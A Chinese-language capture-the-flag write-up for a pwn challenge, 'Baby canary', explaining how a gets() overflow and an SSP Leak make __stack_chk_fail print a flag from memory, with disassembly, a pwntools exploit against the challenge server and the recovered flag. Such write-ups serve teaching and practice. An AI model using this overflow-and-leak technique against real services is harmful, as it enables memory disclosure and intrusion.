# PWN WP Baby canary

`checksec canary2`确认确实有Canary机制保护，IDA打开，`main()`中有：

```
var_8= qword ptr -8

; __unwind {
push    rbp
mov     rbp, rsp
sub     rsp, 30h
mov     rax, fs:28h
mov     [rbp+var_8], rax
xor     eax, eax
```

可以看到函数调用`rbp-0x8`位置为canary

IDA<kbd>F5</kbd>看看`main()`里面突破口

```c
//main()
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // ST08_8
  int fd; // [rsp+4h] [rbp-2Ch]
  char v6; // [rsp+10h] [rbp-20h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(*(_QWORD *)&argc, argv, envp);
  fd = open("flag", 0);
  if ( fd < 0 )
  {
    printf("Not find flag, Wrong!");
    exit(0);
  }
  buf = malloc(0x20uLL);
  read(fd, buf, 0x10uLL);
  puts("Rop is easy for U, try bypass the check!");
  printf("Here is your key: %p\n", buf);
  puts("Say something before leaving.");
  gets((__int64)&v6);
  printf("I hava received your message, bye!");
  return 0;
}
```

可以看到，key（这个`buf`）其实是服务器底下文件`flag`里用`read()`读取出来的flag在内存中的地址，既然能得到flag在内存中的地址，我们只要想办法**输出key地址的字符串**就能得到flag了。

另外：如果要在本地搭建测试的环境的话要建立一个名为flag的文件。

然而这里`gets`完了之后没有地方能直接泄露Canary，一旦输入溢出覆盖了Canary就会：

```shell
root@pjx:~/pjx# nc pwnto.fun 10007
Rop is easy for U, try bypass the check!
Here is your key: 0x1704010
Say something before leaving.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
I hava received your message, bye!*** stack smashing detected ***: ./canary2 terminated
```

然而好在和本地搭建环境不一样，这个`*** stack smashing detected ***: ./canary2`会返回到用户终端，而不是仅在服务器出现。

而`___stack_chk_fail`输出的`*** stack smashing detected ***: ./canary2`中`./canary2`来历有点意思，ELF中本身是没有保存程序名字的，IDA动态调试进入`___stack_chk_fail`一路<kbd>F7</kbd>来到输出这个错误提示的地方：

![image.png](https://i.loli.net/2019/10/19/zDfi3pdOgAyKCT7.png)

可以看到其实`./canary`是会出现在内存中的，就是`a2`地址所在的地方。

---

所以大致的思路就是，让flag的地址，也就是key，覆盖`___stack_chk_fail`输出`./canary`的地址，只要输入溢出，引发`___stack_chk_fail`让flag自己被输出来就行。这就是`SSP Leak`。不过我没想到如何确定要溢出到什么程度才能覆盖掉内存中`a2`储存的地址，经测试，`0x100 * p64(key)`够了。

exploit如下：

```python
from pwn import *

sh = remote('pwnto.fun', 10007)
r1 = sh.recv()
r2 = sh.recv()

s = r2.find(':') + 2
key = int(r2[s:s+9], 16)

log.info("key:"+hex(key))
sh.sendline(p64(key)*0x100)
sh.interactive()
```

运行得到flag:

`Syc{pwn_pWn_Pwn}`